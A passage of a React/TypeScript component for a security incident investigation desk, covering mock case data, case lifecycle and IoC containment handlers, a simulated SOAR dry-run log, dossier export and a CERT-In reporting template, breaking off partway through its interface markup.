        details: 'RPZ rewrite rule applied. Resolution redirected to 127.0.0.1.',
      },
    ],
    notes: [
      {
        id: 'NOTE-07',
        author: 'Analyst-02 (Forensics Lead)',
        role: 'Forensic Investigator',
        timestamp: '2026-09-13 14:15:22 IST',
        category: 'Containment Action',
        content: 'Verified red-team benchmark test. Sinkhole confirmed effective. Case closed with verdict: Controlled Simulation / Verified Sovereign Detection.',
      },
    ],
    forensicChain: {
      merkleRoot: '9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
      section65bCertId: 'CERT-65B-2026-0039-006',
      blockHeight: 10475,
      poaSignature: '0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c',
      totalRecordsVerified: 12,
    },
  },
];

const ANALYSTS_LIST = [
  'Analyst-04 (Gov SOC)',
  'Analyst-01 (Tier 2 Lead)',
  'Analyst-02 (Forensics Lead)',
  'Analyst-03 (NTRO Liaison)',
  'Analyst-05 (CERT-In First Responder)',
  'Unassigned',
];

// ---------------------------------------------------------------------------
// Component
// ---------------------------------------------------------------------------

export const Investigation: React.FC = () => {
  const navigate = useNavigate();
  const [searchParams, setSearchParams] = useSearchParams();
  const requestedCaseParam = searchParams.get('case') || searchParams.get('alertId') || searchParams.get('id');

  const [cases, setCases] = useState<InvestigationCase[]>(() => INITIAL_CASES);
  const [selectedCaseId, setSelectedCaseId] = useState<string>(() => {
    if (requestedCaseParam) {
      const match = INITIAL_CASES.find(
        (c) => c.id === requestedCaseParam || c.relatedAlertIds.includes(requestedCaseParam)
      );
      if (match) return match.id;
    }
    return INITIAL_CASES[0].id;
  });

  // Active workspace tab
  const [activeTab, setActiveTab] = useState<'timeline' | '5w1h' | 'iocs' | 'journal' | 'playbook' | 'section65b'>('5w1h');

  // Filters
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState<string>('ALL');
  const [severityFilter, setSeverityFilter] = useState<string>('ALL');

  // Modals & Notifications
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const [isSection65BModalOpen, setIsSection65BModalOpen] = useState(false);
  const [isCertInModalOpen, setIsCertInModalOpen] = useState(false);
  const [isNewCaseModalOpen, setIsNewCaseModalOpen] = useState(false);
  const [copiedCasHash, setCopiedCasHash] = useState<string | null>(null);
  const [copiedCertInNotice, setCopiedCertInNotice] = useState(false);

  // New Note Form State
  const [newNoteCategory, setNewNoteCategory] = useState<AnalystNote['category']>('Forensic Analysis');
  const [newNoteContent, setNewNoteContent] = useState('');

  // New Case Modal State
  const [newCaseTitle, setNewCaseTitle] = useState('');
  const [newCaseSeverity, setNewCaseSeverity] = useState<CaseSeverity>('HIGH');
  const [newCaseAsset, setNewCaseAsset] = useState('');
  const [newCaseAttacker, setNewCaseAttacker] = useState('');

  // In-Desk SOAR Simulator State
  const [dryRunRunning, setDryRunRunning] = useState(false);
  const [dryRunLogs, setDryRunLogs] = useState<string[]>([]);

  // Update selected case if URL param changes
  useEffect(() => {
    if (requestedCaseParam) {
      const match = cases.find(
        (c) => c.id === requestedCaseParam || c.relatedAlertIds.includes(requestedCaseParam)
      );
      if (match && match.id !== selectedCaseId) {
        setSelectedCaseId(match.id);
      }
    }
  }, [requestedCaseParam, cases, selectedCaseId]);

  // Current active case
  const selectedCase = useMemo(() => {
    return cases.find((c) => c.id === selectedCaseId) || cases[0];
  }, [cases, selectedCaseId]);

  // Handle case selection + update URL without full reload
  const handleSelectCase = (caseId: string) => {
    setSelectedCaseId(caseId);
    setSearchParams({ case: caseId }, { replace: true });
    setDryRunLogs([]);
  };

  // Toast Notification helper
  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 4000);
  };

  // Filtered cases list
  const filteredCases = useMemo(() => {
    return cases.filter((c) => {
      if (statusFilter !== 'ALL' && c.status !== statusFilter) return false;
      if (severityFilter !== 'ALL' && c.severity !== severityFilter) return false;
      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase();
        const matchesQuery =
          c.id.toLowerCase().includes(q) ||
          c.title.toLowerCase().includes(q) ||
          c.analyst.toLowerCase().includes(q) ||
          c.category.toLowerCase().includes(q) ||
          c.matrix5W1H.who.attacker.toLowerCase().includes(q) ||
          c.matrix5W1H.where.asset.toLowerCase().includes(q) ||
          c.matrix5W1H.why.cve.toLowerCase().includes(q);
        if (!matchesQuery) return false;
      }
      return true;
    });
  }, [cases, statusFilter, severityFilter, searchQuery]);

  // Update Case Lifecycle Status
  const handleUpdateStatus = (newStatus: CaseStatus) => {
    setCases((prev) =>
      prev.map((c) => {
        if (c.id === selectedCase.id) {
          const updatedNotes: AnalystNote[] = [
            ...c.notes,
            {
              id: `NOTE-${Date.now()}`,
              author: 'Current Operator',
              role: 'SOC Analyst',
              timestamp: new Date().toLocaleTimeString() + ' IST',
              category: newStatus === 'ESCALATED_CERTIN' ? 'CERT-In Statutory Note' : 'Containment Action',
              content: `Case status transitioned from ${c.status} to ${newStatus}. Lifecycle audit checkpoint verified.`,
            },
          ];
          return {
            ...c,
            status: newStatus,
            updated: 'Just now',
            notes: updatedNotes,
          };
        }
        return c;
      })
    );
    showToast(`Case ${selectedCase.id} status transitioned to "${newStatus}".`);
  };

  // Update Case Analyst
  const handleReassignAnalyst = (newAnalyst: string) => {
    setCases((prev) =>
      prev.map((c) => {
        if (c.id === selectedCase.id) {
          return { ...c, analyst: newAnalyst, updated: 'Just now' };
        }
        return c;
      })
    );
    showToast(`Case ${selectedCase.id} reassigned to ${newAnalyst}.`);
  };

  // Update Case Severity
  const handleUpdateSeverity = (newSeverity: CaseSeverity) => {
    setCases((prev) =>
      prev.map((c) => (c.id === selectedCase.id ? { ...c, severity: newSeverity, updated: 'Just now' } : c))
    );
    showToast(`Case ${selectedCase.id} severity updated to ${newSeverity}.`);
  };

  // Handle IoC Containment Action
  const handleIoCContainment = (iocId: string, actionLabel: string, targetStatus: IoCStatus) => {
    setCases((prev) =>
      prev.map((c) => {
        if (c.id === selectedCase.id) {
          const updatedIocs = c.iocs.map((ioc) =>
            ioc.id === iocId ? { ...ioc, status: targetStatus } : ioc
          );
          const targetedIoc = c.iocs.find((ioc) => ioc.id === iocId);
          const containmentNote: AnalystNote = {
            id: `NOTE-${Date.now()}`,
            author: c.analyst,
            role: 'SOC Operations',
            timestamp: new Date().toLocaleTimeString() + ' IST',
            category: 'Containment Action',
            content: `[ONE-CLICK CONTAINMENT] Applied "${actionLabel}" on ${targetedIoc?.type} "${targetedIoc?.value}". Status updated to ${targetStatus}.`,
          };
          return {
            ...c,
            iocs: updatedIocs,
            notes: [...c.notes, containmentNote],
            updated: 'Just now',
          };
        }
        return c;
      })
    );
    showToast(`Containment action triggered: ${actionLabel} applied.`);
  };

  // Handle Adding an Analyst Note
  const handleAddNote = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newNoteContent.trim()) return;

    const createdNote: AnalystNote = {
      id: `NOTE-${Date.now()}`,
      author: 'Current Operator',
      role: 'Forensic Specialist',
      timestamp: new Date().toLocaleTimeString() + ' IST',
      category: newNoteCategory,
      content: newNoteContent.trim(),
    };

    setCases((prev) =>
      prev.map((c) => {
        if (c.id === selectedCase.id) {
          return {
            ...c,
            notes: [...c.notes, createdNote],
            updated: 'Just now',
          };
        }
        return c;
      })
    );

    setNewNoteContent('');
    showToast('Analyst finding logged in permanent evidence journal.');
  };

  // Handle Creating a New Manual Case
  const handleCreateNewCase = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newCaseTitle.trim()) return;

    const newId = `CASE-2026-${String(Math.floor(1000 + Math.random() * 9000))}`;
    const newCaseItem: InvestigationCase = {
      id: newId,
      relatedAlertIds: [],
      title: newCaseTitle.trim(),
      severity: newCaseSeverity,
      status: 'NEW',
      category: 'Manual Incident Escalation',
      analyst: 'Analyst-04 (Gov SOC)',
      created: new Date().toLocaleTimeString() + ' IST',
      updated: 'Just now',
      slaDeadlineIst: 'In 6 hours',
      slaHoursRemaining: 6.0,
      mitreTechniques: [{ id: 'T1059', name: 'Command & Scripting', tactic: 'TA0002 Execution' }],
      recommendedPlaybook: {
        id: 'PB-HOST-ISOLATION',
        name: 'Compromised Node Network Quarantine',
        reason: 'Manual containment trigger for suspect node.',
        blastRadius: 'MEDIUM',
        targetAsset: newCaseAsset || 'Internal Target Host',
      },
      matrix5W1H: {
        who: {
          attacker: newCaseAttacker || 'Pending Attribution',
          attribution: 'Under Active Investigation',
          geo: 'External Ingress',
          asn: 'AS-PENDING',
        },
        what: {
          attackType: 'Manual Forensic Investigation Initiated',
          technique: 'Pending Discovery (T1059)',
          targetProtocol: 'TCP/IP',
          payloadSummary: 'Manual investigation case opened by Tier 2 SOC Analyst',
        },
        where: {
          asset: newCaseAsset || '10.0.1.20 / Internal Host',
          zone: 'Trust Network',
          hostname: newCaseAsset || 'ws-internal-01',
          subnet: '10.0.1.0/24',
        },
        when: {
          firstSeen: new Date().toLocaleTimeString() + ' UTC',
          lastSeen: 'Active',
          burstDuration: 'Under Observation',
          eventCount: 1,
        },
        why: {
          ruleTriggered: 'MANUAL-OPERATOR-ESCALATION',
          cve: 'Pending',
          confidence: 'Analyst Initiated',
          intent: 'Operator manual triage and investigation containment',
        },
        how: {
          executionPath: 'Manual investigation workflow',
          privilege: 'Standard / Administrative',
        },
      },
      iocs: newCaseAttacker
        ? [
            {
              id: `IOC-${Date.now()}`,
              type: 'IPv4',
              value: newCaseAttacker,
              confidence: 90,
              reputation: 'SUSPICIOUS',
              status: 'ACTIVE',
              firstSeen: new Date().toLocaleTimeString() + ' IST',
            },
          ]
        : [],
      timeline: [
        {
          id: `TL-${Date.now()}`,
          timestamp: new Date().toISOString(),
          event: 'Incident Case opened manually via Security Investigation Desk',
          source: 'ULPF SOC Operations Desk',
          vendor: 'Sovereign Incident Orchestrator',
          action: 'DETECT',
          casHash: `cas/${Math.random().toString(36).substring(2, 8)}/...`,
          details: 'Mandatory CERT-In 6-Hour reporting clock initiated.',
        },
      ],
      notes: [
        {
          id: `NOTE-${Date.now()}`,
          author: 'Analyst-04 (Gov SOC)',
          role: 'Incident Response Lead',
          timestamp: new Date().toLocaleTimeString() + ' IST',
          category: 'Initial Assessment',
          content: `Case ${newId} initialized. Asset: ${newCaseAsset || 'Unspecified'}. Threat: ${newCaseAttacker || 'Unspecified'}.`,
        },
      ],
      forensicChain: {
        merkleRoot: '70860df3cc8060cbf30aaa94f441d89cbfb9ecb98b0eaf38acc54470e2c566eb',
        section65bCertId: `CERT-65B-${newId}-001`,
        blockHeight: 10485,
        poaSignature: 'e698193cfa4a85d6370a5dbb328b6197d51b5e89e8d4afb07218fff97b94dc7e',
        totalRecordsVerified: 1,
      },
    };

    setCases((prev) => [newCaseItem, ...prev]);
    setSelectedCaseId(newId);
    setSearchParams({ case: newId }, { replace: true });
    setIsNewCaseModalOpen(false);
    setNewCaseTitle('');
    setNewCaseAsset('');
    setNewCaseAttacker('');
    showToast(`New Incident Case ${newId} provisioned successfully.`);
  };

  // In-Desk Safe Dry-Run Simulation Execution
  const handleRunInDeskSimulation = () => {
    setDryRunRunning(true);
    setDryRunLogs([
      `[${new Date().toLocaleTimeString()}] [SOAR DRY-RUN] Initializing Zero-Side-Effect Simulator for ${selectedCase.recommendedPlaybook.id}...`,
      `[${new Date().toLocaleTimeString()}] [AUTH] Verifying role permissions: secops.containment.network, firewall.ports.write... [VERIFIED]`,
      `[${new Date().toLocaleTimeString()}] [PREVIEW] Target entity: ${selectedCase.recommendedPlaybook.targetAsset}`,
      `[${new Date().toLocaleTimeString()}] [DRY-RUN] Step 1: Quarantining host route table (0 live mutations committed - simulated).`,
      `[${new Date().toLocaleTimeString()}] [DRY-RUN] Step 2: Severing lateral ports 445, 139, 3389 at virtual switch boundary.`,
      `[${new Date().toLocaleTimeString()}] [AUDIT] Generating cryptographic audit receipt with Merkle proof...`,
      `[${new Date().toLocaleTimeString()}] [VERDICT] PASS_NO_SIDE_EFFECTS · Blast Radius: ${selectedCase.recommendedPlaybook.blastRadius} · 0 Host Disruptions.`,
    ]);
    setTimeout(() => {
      setDryRunRunning(false);
      showToast('SOAR Dry-Run simulation completed with PASS_NO_SIDE_EFFECTS verdict.');
    }, 1200);
  };

  // Copy CAS Hash
  const handleCopyHash = (hash: string) => {
    navigator.clipboard.writeText(hash);
    setCopiedCasHash(hash);
    setTimeout(() => setCopiedCasHash(null), 2500);
  };

  // Export JSON Dossier
  const handleExportDossier = () => {
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(selectedCase, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute('href', dataStr);
    downloadAnchor.setAttribute('download', `${selectedCase.id}-forensic-dossier.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
    showToast(`Dossier ${selectedCase.id} exported successfully.`);
  };

  // Statutory CERT-In 6-Hour Formal Notice Text
  const certInReportText = useMemo(() => {
    return `================================================================================
STATUTORY CYBER INCIDENT REPORTING TEMPLATE (CERT-In 6-HOUR RULE)
Rule 20(1) of Information Technology (The Indian Computer Emergency Response Team
and Manner of Performing Functions and Duties) Rules, 2013 & Directions 2022
================================================================================
INCIDENT TRACKING ID   : ${selectedCase.id}
DATE & TIME OF EVENT   : ${selectedCase.matrix5W1H.when.firstSeen}
REPORTING AGENCY / SOC : National Technical Research Organisation (NTRO) / ULPF SOC
INVESTIGATING OFFICER  : ${selectedCase.analyst}
CERT-IN SLA DEADLINE   : ${selectedCase.slaDeadlineIst} (${selectedCase.slaHoursRemaining}h remaining)

1. NATURE OF INCIDENT:
   Category   : ${selectedCase.category}
   Severity   : ${selectedCase.severity}
   MITRE IDs  : ${selectedCase.mitreTechniques.map((m) => `${m.id} (${m.name})`).join(', ')}

2. ATTRIBUTION & SOURCE:
   Attacker IP / Origin : ${selectedCase.matrix5W1H.who.attacker}
   Geo / ASN Location   : ${selectedCase.matrix5W1H.who.geo} (${selectedCase.matrix5W1H.who.asn})
   Targeted Asset       : ${selectedCase.matrix5W1H.where.asset}
   Security Zone        : ${selectedCase.matrix5W1H.where.zone}

3. TECHNICAL DETAILS:
   Vulnerability / CVE  : ${selectedCase.matrix5W1H.why.cve}
   Attack Mechanics     : ${selectedCase.matrix5W1H.what.payloadSummary}
   Detection Rule       : ${selectedCase.matrix5W1H.why.ruleTriggered}

4. INDICATORS OF COMPROMISE (IoCs):
${selectedCase.iocs.map((ioc) => `   - [${ioc.type}] ${ioc.value} (${ioc.reputation}, Status: ${ioc.status})`).join('\n')}

5. FORENSIC INTEGRITY:
   Merkle Root Digest   : ${selectedCase.forensicChain.merkleRoot}
   Section 65B Cert ID  : ${selectedCase.forensicChain.section65bCertId}
   PoA Chain Signature  : ${selectedCase.forensicChain.poaSignature}
================================================================================`;
  }, [selectedCase]);

  const handleCopyCertInNotice = () => {
    navigator.clipboard.writeText(certInReportText);
    setCopiedCertInNotice(true);
    setTimeout(() => setCopiedCertInNotice(false), 2500);
    showToast('CERT-In formal notice copied to clipboard.');
  };

  // Helper Badge Colors
  const getSeverityBadgeVariant = (s: CaseSeverity): 'danger' | 'warn' | 'info' | 'neutral' => {
    switch (s) {
      case 'CRITICAL':
        return 'danger';
      case 'HIGH':
        return 'warn';
      case 'MEDIUM':
        return 'info';
      case 'LOW':
      default:
        return 'neutral';
    }
  };

  const getStatusBadgeVariant = (st: CaseStatus): 'ok' | 'warn' | 'danger' | 'info' | 'neutral' => {
    switch (st) {
      case 'NEW':
        return 'danger';
      case 'TRIAGED':
        return 'warn';
      case 'IN_PROGRESS':
        return 'info';
      case 'RESOLVED':
        return 'ok';
      case 'ESCALATED_CERTIN':
        return 'danger';
      default:
        return 'neutral';
    }
  };

  return (
    <div className="space-y-4">
      {/* Toast Alert Banner */}
      {toastMessage && (
        <div className="fixed top-4 right-4 z-50 bg-navy-900 text-white text-xs px-4 py-2.5 rounded shadow-xl border border-gov-blue/40 flex items-center gap-2 animate-in fade-in slide-in-from-top-2">
          <Sparkles className="w-4 h-4 text-emerald-400" />
          <span>{toastMessage}</span>
        </div>
      )}

      {/* Top Header Command Bar */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-3 border-b border-border-light">
        <div>
          <div className="flex items-center gap-2">
            <h2 className="text-lg font-bold text-navy-900 tracking-tight flex items-center gap-2">
              <ShieldAlert className="w-5 h-5 text-gov-blue" />
              Security Incident Investigation Desk
            </h2>
            <Badge variant="info">SOVEREIGN SOC TIER 2</Badge>
          </div>
          <p className="text-xs text-slate-500 mt-0.5">
            Active case lifecycle orchestration (NEW &rarr; TRIAGED &rarr; IN_PROGRESS &rarr; RESOLVED &rarr; CERT-IN) with 5W1H telemetry attribution and Section 65B forensic chain.
          </p>
        </div>

        <div className="flex items-center gap-2 flex-wrap">
          {/* Statutory 6-Hour SLA Clock */}
          <div className="flex items-center gap-1.5 px-3 py-1.5 rounded bg-amber-50 border border-amber-200 text-amber-900 text-xs font-mono">
            <Clock className="w-3.5 h-3.5 text-amber-600 animate-pulse" />
            <span className="font-semibold">CERT-In SLA:</span>
            <span>{selectedCase.slaHoursRemaining}h remaining</span>
          </div>

          <Button
            size="sm"
            variant="outline"
            onClick={() => setIsCertInModalOpen(true)}
            className="text-xs h-8 flex items-center gap-1.5 border-amber-300 hover:bg-amber-50 text-amber-900"
          >
            <Send className="w-3.5 h-3.5 text-amber-700" />
            CERT-In Notice
          </Button>

          <Button
            size="sm"
            variant="outline"
            onClick={() => setIsSection65BModalOpen(true)}
            className="text-xs h-8 flex items-center gap-1.5 border-gov-border hover:bg-gov-light text-gov-blue"
          >
            <FileCheck className="w-3.5 h-3.5" />
            Section 65B Dossier
          </Button>

          <Button
            size="sm"
            variant="primary"
            onClick={() => setIsNewCaseModalOpen(true)}
            className="text-xs h-8 flex items-center gap-1.5"
          >
            <Plus className="w-3.5 h-3.5" />
            New Case
          </Button>
        </div>
      </div>

      {/* Main Grid: Left Navigator (4 cols) & Right Workdesk (8 cols) */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
        {/* ================================================================= */}
        {/* LEFT PANE: Case Navigator & Filters                               */}
        {/* ================================================================= */}
        <div className="lg:col-span-4 space-y-3">
          {/* Search & Severity Filters */}
          <div className="bg-white p-3 rounded border border-border-light shadow-xs space-y-2.5">
            <div className="relative">
              <Search className="w-3.5 h-3.5 text-slate-400 absolute left-2.5 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                placeholder="Search case, attacker IP, CVE, asset..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pl-8 pr-3 py-1.5 text-xs bg-slate-50 border border-slate-200 rounded focus:outline-none focus:ring-1 focus:ring-gov-blue focus:bg-white transition-all text-navy-900"
              />
              {searchQuery && (
                <button
                  onClick={() => setSearchQuery('')}
                  className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600"
                >
                  <X className="w-3 h-3" />
                </button>
              )}
            </div>

            {/* Quick Status Tabs */}
            <div className="flex items-center gap-1 overflow-x-auto pb-1 text-[11px]">
              {(['ALL', 'NEW', 'IN_PROGRESS', 'TRIAGED', 'RESOLVED'] as const).map((st) => (
                <button
                  key={st}
                  onClick={() => setStatusFilter(st)}
                  className={`px-2 py-0.5 rounded text-[10.5px] font-semibold transition-colors flex-shrink-0 ${
                    statusFilter === st
                      ? 'bg-navy-900 text-white'
                      : 'bg-slate-100 text-slate-600 hover:bg-slate-200'
                  }`}
                >
                  {st}
                </button>
              ))}
            </div>

            {/* Severity Quick Pills */}
            <div className="flex items-center justify-between text-[11px] pt-1 border-t border-slate-100">
              <span className="text-slate-500 font-medium">Severity:</span>
              <div className="flex items-center gap-1">
                {(['ALL', 'CRITICAL', 'HIGH', 'MEDIUM'] as const).map((sev) => (
                  <button
                    key={sev}
                    onClick={() => setSeverityFilter(sev)}
                    className={`px-1.5 py-0.5 rounded text-[10px] font-mono transition-colors ${
                      severityFilter === sev
                        ? 'bg-gov-blue text-white font-bold'
                        : 'text-slate-500 hover:bg-slate-100'
                    }`}
                  >
                    {sev}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Cases List */}
          <div className="space-y-2">
            <div className="flex items-center justify-between px-1 text-xs font-bold text-slate-400 uppercase tracking-wider">
              <span>ACTIVE INCIDENT QUEUE ({filteredCases.length})</span>
              <span className="text-[10px] text-slate-400 font-mono">NPL-SYNCED</span>
            </div>

            {filteredCases.length === 0 ? (
              <div className="p-6 bg-white border border-border-light rounded text-center text-xs text-slate-500">
                No incident cases match the selected filters.
              </div>
            ) : (
              filteredCases.map((c) => {
                const isSelected = selectedCase.id === c.id;
                return (
                  <div
                    key={c.id}
                    onClick={() => handleSelectCase(c.id)}
                    className={`p-3 rounded border transition-all cursor-pointer ${
                      isSelected
                        ? 'bg-gov-light border-gov-blue shadow-xs ring-1 ring-gov-blue'
                        : 'bg-white border-border-light hover:bg-slate-50'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-1.5">
                      <div className="flex items-center gap-1.5">
                        <span className="font-mono text-[11px] font-bold text-gov-blue">{c.id}</span>
                        {c.status === 'IN_PROGRESS' && (
                          <span className="w-1.5 h-1.5 rounded-full bg-blue-600 animate-ping" />
                        )}
                      </div>
                      <div className="flex items-center gap-1">
                        <Badge variant={getSeverityBadgeVariant(c.severity)} className="text-[10px]">
                          {c.severity}
                        </Badge>
                        <Badge variant={getStatusBadgeVariant(c.status)} dot className="text-[10px]">
                          {c.status}
                        </Badge>
                      </div>
                    </div>

                    <div className="text-xs font-semibold text-navy-900 mb-1 leading-snug">
                      {c.title}
                    </div>

                    <div className="flex items-center gap-2 text-[10.5px] text-slate-600 mb-2">
                      <span className="font-mono bg-slate-100 px-1 py-0.5 rounded text-slate-700">
                        {c.matrix5W1H.who.attacker}
                      </span>
                      <span>&rarr;</span>
                      <span className="font-mono text-slate-700 truncate max-w-[130px]">
                        {c.matrix5W1H.where.hostname || c.matrix5W1H.where.asset}
                      </span>
                    </div>

                    <div className="flex items-center justify-between text-[10.5px] text-slate-500 font-mono pt-1.5 border-t border-slate-100">
                      <div className="flex items-center gap-1 truncate max-w-[180px]">
                        <User className="w-3 h-3 text-slate-400 flex-shrink-0" />
                        <span className="truncate">{c.analyst}</span>
                      </div>
                      <div className="flex items-center gap-1">
                        <Clock className="w-3 h-3 text-slate-400" />
                        <span>{c.updated}</span>
                      </div>
                    </div>
                  </div>
                );
              })
            )}
          </div>
        </div>

        {/* ================================================================= */}
        {/* RIGHT PANE: Case Command Center & Evidence Workspace              */}
        {/* ================================================================= */}
        <div className="lg:col-span-8 space-y-4">
          {/* Active Case Master Card */}
          <div className="bg-white rounded border border-border-light shadow-sm overflow-hidden">
            {/* Case Header & Lifecycle Controls */}
            <div className="p-4 bg-surface-alt border-b border-border-light space-y-3">
              <div className="flex flex-col sm:flex-row sm:items-start justify-between gap-3">
                <div className="space-y-1">
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className="font-mono text-xs font-bold text-gov-blue px-2 py-0.5 bg-blue-50 border border-blue-200 rounded">
                      {selectedCase.id}
                    </span>
                    <Badge variant={getSeverityBadgeVariant(selectedCase.severity)}>
                      {selectedCase.severity}
                    </Badge>
                    <Badge variant={getStatusBadgeVariant(selectedCase.status)} dot>
                      {selectedCase.status}
                    </Badge>
                    <span className="text-[11px] text-slate-400 font-mono">
                      Category: {selectedCase.category}
                    </span>
                  </div>

                  <h3 className="text-base font-bold text-navy-900 leading-snug">
                    {selectedCase.title}
                  </h3>

                  <div className="flex items-center gap-3 text-xs text-slate-500 flex-wrap">
                    <span className="flex items-center gap-1">
                      <User className="w-3.5 h-3.5 text-slate-400" />
                      Assigned: <strong>{selectedCase.analyst}</strong>
                    </span>
                    <span>&bull;</span>
                    <span className="flex items-center gap-1">
                      <Clock className="w-3.5 h-3.5 text-slate-400" />
                      Created: {selectedCase.created}
                    </span>
                  </div>
                </div>

                {/* Quick Actions Pivot */}
                <div className="flex items-center gap-2 flex-shrink-0">
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={handleExportDossier}
                    className="text-xs h-7.5 flex items-center gap-1"
                    title="Export Machine-Readable JSON Dossier"
                  >
                    <Download className="w-3.5 h-3.5" />
                    Export Dossier
                  </Button>

                  <Button
                    size="sm"
                    variant="primary"
                    onClick={() =>
                      navigate(
                        `/playbooks?playbook=${selectedCase.recommendedPlaybook.id}&asset=${encodeURIComponent(
                          selectedCase.recommendedPlaybook.targetAsset
                        )}`
                      )
                    }
                    className="text-xs h-7.5 flex items-center gap-1 !bg-navy-900 hover:!bg-navy-800"
                    title="Pivot directly to SOAR Response Playbooks"
                  >
                    <Zap className="w-3.5 h-3.5 text-amber-400" />
                    Pivot to SOAR
                  </Button>
                </div>
              </div>

              {/* Interactive Case Lifecycle & Reassignment Bar */}
              <div className="pt-2.5 border-t border-slate-200/80 flex flex-wrap items-center justify-between gap-3 text-xs">
                <div className="flex items-center gap-2">
                  <span className="text-slate-500 font-semibold text-[11px]">LIFECYCLE STATUS:</span>
                  <div className="flex items-center gap-1">
                    {(['NEW', 'TRIAGED', 'IN_PROGRESS', 'RESOLVED', 'ESCALATED_CERTIN'] as const).map((st) => (
                      <button
                        key={st}
                        onClick={() => handleUpdateStatus(st)}
                        className={`px-2 py-0.5 rounded text-[10.5px] font-semibold border transition-all ${
                          selectedCase.status === st
                            ? 'bg-gov-blue text-white border-gov-blue shadow-xs'
                            : 'bg-white text-slate-700 border-slate-200 hover:bg-slate-100'
                        }`}
                      >
                        {st}
                      </button>
                    ))}
                  </div>
                </div>

                <div className="flex items-center gap-3">
                  {/* Reassign Analyst Dropdown */}
                  <div className="flex items-center gap-1.5">
                    <span className="text-slate-500 text-[11px]">Reassign:</span>
                    <select
                      value={selectedCase.analyst}
                      onChange={(e) => handleReassignAnalyst(e.target.value)}
                      className="text-xs bg-white border border-slate-200 rounded px-2 py-0.5 text-navy-900 focus:ring-1 focus:ring-gov-blue"
                    >
                      {ANALYSTS_LIST.map((a) => (
                        <option key={a} value={a}>
                          {a}
                        </option>
                      ))}
                    </select>
                  </div>

                  {/* Adjust Severity */}
                  <div className="flex items-center gap-1.5">
                    <span className="text-slate-500 text-[11px]">Severity:</span>
                    <select
                      value={selectedCase.severity}
                      onChange={(e) => handleUpdateSeverity(e.target.value as CaseSeverity)}
                      className="text-xs bg-white border border-slate-200 rounded px-2 py-0.5 text-navy-900 focus:ring-1 focus:ring-gov-blue font-bold"
                    >
                      <option value="CRITICAL">CRITICAL</option>
                      <option value="HIGH">HIGH</option>
                      <option value="MEDIUM">MEDIUM</option>
                      <option value="LOW">LOW</option>
                    </select>
                  </div>
                </div>
              </div>
            </div>

            {/* Navigation Tabs */}
            <div className="px-4 bg-slate-50 border-b border-border-light flex items-center gap-4 overflow-x-auto text-xs">
              <button
                onClick={() => setActiveTab('5w1h')}
                className={`py-2.5 font-bold border-b-2 flex items-center gap-1.5 transition-colors ${
                  activeTab === '5w1h'
                    ? 'border-gov-blue text-gov-blue'
                    : 'border-transparent text-slate-500 hover:text-navy-900'
                }`}
              >
                <Layers className="w-3.5 h-3.5" />
                5W1H Threat Matrix
              </button>

              <button
                onClick={() => setActiveTab('timeline')}
                className={`py-2.5 font-bold border-b-2 flex items-center gap-1.5 transition-colors ${
                  activeTab === 'timeline'
                    ? 'border-gov-blue text-gov-blue'
                    : 'border-transparent text-slate-500 hover:text-navy-900'
                }`}
              >
                <Activity className="w-3.5 h-3.5" />
                Telemetry Timeline ({selectedCase.timeline.length})
              </button>

              <button
                onClick={() => setActiveTab('iocs')}
                className={`py-2.5 font-bold border-b-2 flex items-center gap-1.5 transition-colors ${
                  activeTab === 'iocs'
                    ? 'border-gov-blue text-gov-blue'
                    : 'border-transparent text-slate-500 hover:text-navy-900'
                }`}
              >
                <Fingerprint className="w-3.5 h-3.5" />
                IoC Workbench ({selectedCase.iocs.length})
              </button>

              <button
                onClick={() => setActiveTab('journal')}
                className={`py-2.5 font-bold border-b-2 flex items-center gap-1.5 transition-colors ${
                  activeTab === 'journal'
                    ? 'border-gov-blue text-gov-blue'
                    : 'border-transparent text-slate-500 hover:text-navy-900'
                }`}
              >
                <FileText className="w-3.5 h-3.5" />
                Analyst Journal ({selectedCase.notes.length})
              </button>

              <button
                onClick={() => setActiveTab('playbook')}
                className={`py-2.5 font-bold border-b-2 flex items-center gap-1.5 transition-colors ${
                  activeTab === 'playbook'
                    ? 'border-gov-blue text-gov-blue'
                    : 'border-transparent text-slate-500 hover:text-navy-900'
                }`}
              >
                <Zap className="w-3.5 h-3.5" />
                SOAR Remediation
              </button>

              <button
                onClick={() => setActiveTab('section65b')}
                className={`py-2.5 font-bold border-b-2 flex items-center gap-1.5 transition-colors ${
                  activeTab === 'section65b'
                    ? 'border-gov-blue text-gov-blue'
                    : 'border-transparent text-slate-500 hover:text-navy-900'
                }`}
              >
                <FileCheck className="w-3.5 h-3.5" />
                Evidence Chain & Proof
              </button>
            </div>

            {/* TAB CONTENT AREA */}
            <div className="p-4">
              {/* ============================================================= */}
              {/* TAB 1: 5W1H Threat Attribution Matrix                        */}
              {/* ============================================================= */}
              {activeTab === '5w1h' && (
                <div className="space-y-4 text-xs">
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                    {/* WHO */}
                    <div className="bg-slate-50 p-3 rounded border border-slate-200 space-y-1.5">
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] text-gov-blue uppercase font-bold tracking-wider">
                          1. WHO (Attribution)
                        </span>
                        <Badge variant="danger" className="text-[9.5px]">THREAT ACTOR</Badge>
                      </div>
